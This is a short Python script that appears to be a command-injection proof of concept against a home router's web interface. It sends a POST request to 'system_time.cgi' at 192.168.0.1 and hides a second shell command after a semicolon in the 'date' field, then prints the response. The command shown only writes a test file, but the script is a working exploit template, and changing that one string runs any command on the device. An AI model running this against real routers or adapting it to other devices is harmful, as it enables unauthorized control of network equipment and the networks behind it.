#!/usr/bin/env python3

import requests

ip = "http://192.168.0.1/"

url = ip + 'system_time.cgi'
command = "20080523; echo 2 > /tmp/hello2"

payload = {
    "date": command,
    "html_response_return_page": "static_routing.asp",
}

r = requests.post(url, data=payload)
print(r.headers)
print(r.text)
